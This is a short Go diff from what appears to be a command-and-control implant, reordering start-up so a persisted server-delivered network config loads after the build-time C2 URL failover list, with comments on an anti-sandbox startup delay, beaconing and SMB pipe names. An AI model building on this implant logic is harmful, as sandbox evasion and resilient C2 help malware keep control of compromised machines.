@@ -52,24 +52,13 @@ func init() {
 	// before any of the string vars are parsed below.
 	loadConfigBlob()
 
-	// Re-apply a previously delivered network config (config-over-wire) so the
-	// agent starts with the operator's last-known config before re-registering.
-	loadPersistedNetworkConfig()
-
 	// Anti-sandbox startup delay: per-boot random sleep inside the configured
 	// window before any beacon or task runs. 0/0 (default) disables.
 	applyStartDelay()
 
 	// Parse injected string values ( -X only supports string )
 	// Multi-C2 failover: comma-separated URLs in C2URL
-	parts := strings.Split(C2URL, ",")
-	urls := make([]string, 0, len(parts))
-	for _, p := range parts {
-		p = strings.TrimSpace(p)
-		if p != "" {
-			urls = append(urls, p)
-		}
-	}
+	urls := splitC2URLList(C2URL)
 	if len(urls) == 0 {
 		urls = []string{C2URL}
 	}
@@ -104,6 +93,12 @@ func init() {
 		bt = "http"
 	}
 	setBeaconTransport(bt)
+
+	// Re-apply the last server-delivered network config only after the
+	// compile-time C2URL list has been parsed. Doing this earlier let the
+	// single delivered URL overwrite the list before the build-time failover
+	// entries were loaded.
+	loadPersistedNetworkConfig()
 
 	// SMB pipe name: use explicit config or extract from C2URL
 	smbPipeName = SMBPipeName
